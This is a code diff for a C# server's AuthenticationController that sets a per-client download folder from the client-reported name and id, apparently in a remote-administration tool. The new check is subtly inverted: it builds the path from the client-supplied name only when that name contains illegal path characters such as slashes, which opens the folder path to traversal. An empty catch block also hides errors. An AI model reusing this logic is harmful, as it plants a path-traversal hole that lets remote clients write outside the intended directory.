@@ -1,11 +1,17 @@
 ﻿using Serveur.Controllers.Server;
 using Serveur.Packets.ClientPackets;
+using System.IO;
+using System.Linq;
+using System.Windows.Forms;
 
 namespace Serveur.Controllers
 {
     //Authentification
     class AuthenticationController
     {
+
+        private static readonly char[] _illegalChars = Path.GetInvalidPathChars().Union(Path.GetInvalidFileNameChars()).ToArray();
+
         public static void HandleGetAuthenticationResponse(ClientMosaic client, GetAuthenticationResponse packet)
         {
             if (client.endPoint.Address.ToString() == "255.255.255.255")
@@ -23,14 +29,19 @@ namespace Serveur.Controllers
                 client.value.id = packet.id;
                 client.value.name = packet.name;
 
-                // client.Value.DownloadDirectory = (!FileHelper.CheckPathForIllegalChars(client.Value.UserAtPc)) ?
-                // Path.Combine(Application.StartupPath, string.Format("Clients\\{0}_{1}\\", client.Value.UserAtPc, client.Value.Id.Substring(0, 7))) :
-                //Path.Combine(Application.StartupPath, string.Format("Clients\\{0}_{1}\\", client.EndPoint.Address, client.Value.Id.Substring(0, 7)));
-
+                client.value.downloadDirectory = (checkPathForIllegalChars(client.value.name)) ?
+                    Path.Combine(Application.StartupPath, string.Format("Clients\\{0}_{1}\\", client.value.name, client.value.id.Substring(0, 7))) :
+                    Path.Combine(Application.StartupPath, string.Format("Clients\\{0}_{1}\\", client.endPoint.Address, client.value.id.Substring(0, 7)));
             }
             catch
             {
             }
         }
+
+    public static bool checkPathForIllegalChars(string path)
+    {
+        return path.Any(c => _illegalChars.Contains(c));
+    }
+
     }
 }
